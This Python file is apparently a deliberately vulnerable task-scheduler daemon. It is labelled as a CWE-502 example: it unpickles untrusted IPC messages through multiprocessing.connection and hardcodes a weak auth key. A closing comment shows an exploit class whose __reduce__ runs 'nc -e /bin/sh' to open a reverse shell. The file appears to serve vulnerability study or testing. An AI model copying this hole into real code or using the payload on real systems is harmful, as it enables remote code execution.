import os
import sys
import sqlite3
import logging
import threading
from datetime import datetime
from multiprocessing.connection import Listener

# Configure logging for the Local IPC Task Scheduler Daemon
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - TaskDaemon - %(levelname)s - %(message)s'
)
logger = logging.getLogger("IPC_Daemon")

DB_FILE = "/tmp/scheduler_tasks.db"
IPC_ADDRESS = ('localhost', 6000)
AUTH_KEY = b'secret_cluster_key'

def init_db():
    """Initializes the SQLite database for tracking scheduled system tasks."""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS scheduled_tasks (
            task_id TEXT PRIMARY KEY,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            command TEXT NOT NULL,
            run_at DATETIME NOT NULL,
            status TEXT NOT NULL
        )
    ''')
    
    # Pre-populate with mock history
    mock_history = [
        ('task_alpha_01', 'echo "Backup complete"', datetime.now().isoformat(), 'COMPLETED'),
        ('task_beta_02', 'cleanup_tmp.sh', datetime.now().isoformat(), 'PENDING')
    ]
    cursor.executemany('''
        INSERT OR IGNORE INTO scheduled_tasks (task_id, command, run_at, status)
        VALUES (?, ?, ?, ?)
    ''', mock_history)
    
    conn.commit()
    conn.close()
    logger.info("Task scheduling database initialized.")

def log_task(task_id: str, command: str, run_at: str, status: str):
    """Records a new scheduled task to the database."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO scheduled_tasks (task_id, command, run_at, status) VALUES (?, ?, ?, ?)",
            (task_id, command, run_at, status)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error logging task {task_id}: {e}")

class ScheduleRequest:
    """Represents a request to schedule a new system command."""
    def __init__(self, task_id, command, run_at):
        self.task_id = task_id
        self.command = command
        self.run_at = run_at

def process_ipc_message(conn):
    """
    VULNERABLE FUNCTION: CWE-502 Deserialization of Untrusted Data
    Trigger Path: multiprocessing.connection.Listener IPC socket (Implicit Pickle payload)
    """
    try:
        client_address = conn.fileno()
        logger.info(f"Processing incoming IPC message from FD: {client_address}")
    except Exception:
        logger.info("Processing incoming IPC message.")
        
    try:
        # Vulnerability: The multiprocessing.connection module's recv() method 
        # implicitly uses the pickle module under the hood to deserialize objects 
        # sent over the IPC socket. If an attacker can connect to this listener 
        # (even with a known/weak authkey), they can send a maliciously crafted 
        # pickled object. Developers often miss this because the pickle import 
        # is hidden within the standard library's IPC abstraction.
        
        # CWE-502 occurs instantly when recv() unpickles the incoming byte stream.
        request_obj = conn.recv()
        
        if isinstance(request_obj, ScheduleRequest):
            logger.debug(f"Valid task request received: {request_obj.task_id}")
            log_task(request_obj.task_id, request_obj.command, request_obj.run_at, "QUEUED")
            conn.send({"status": "SUCCESS", "message": f"Task {request_obj.task_id} queued."})
        else:
            logger.warning(f"Decoded object is not a valid ScheduleRequest. Type: {type(request_obj)}")
            conn.send({"status": "ERROR", "message": "Invalid request format."})
            
    except EOFError:
        logger.warning("IPC Client disconnected unexpectedly.")
    except Exception as e:
        logger.error(f"Failed to process IPC message: {e}")
        try:
            conn.send({"status": "ERROR", "message": "Internal processing error."})
        except:
            pass
    finally:
        conn.close()

def start_ipc_daemon():
    """Configures and starts the IPC listener daemon."""
    init_db()
    
    try:
        # The listener binds to a port and authenticates using a pre-shared key
        listener = Listener(address=IPC_ADDRESS, authkey=AUTH_KEY)
        logger.info(f"Starting Task IPC Daemon listening on {IPC_ADDRESS}")
        
        while True:
            # Accept an incoming connection
            conn = listener.accept()
            logger.info("New IPC connection accepted.")
            
            # Handle the connection in a new thread
            client_thread = threading.Thread(
                target=process_ipc_message,
                args=(conn,)
            )
            client_thread.start()
            
    except KeyboardInterrupt:
        logger.info("Daemon shutting down gracefully.")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Fatal daemon error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    # Example Malicious Trigger (Local or Network Attacker with auth key access):
    # 1. Attacker writes a script to connect to the Listener:
    #    from multiprocessing.connection import Client
    #    import os
    #
    #    class Exploit:
    #        def __reduce__(self):
    #            return (os.system, ('nc -e /bin/sh 127.0.0.1 4444',))
    #
    #    # Client() implicitly uses pickle to serialize and send the malicious object
    #    conn = Client(('localhost', 6000), authkey=b'secret_cluster_key')
    #    conn.send(Exploit())
    #    print(conn.recv())
    
    start_ipc_daemon()
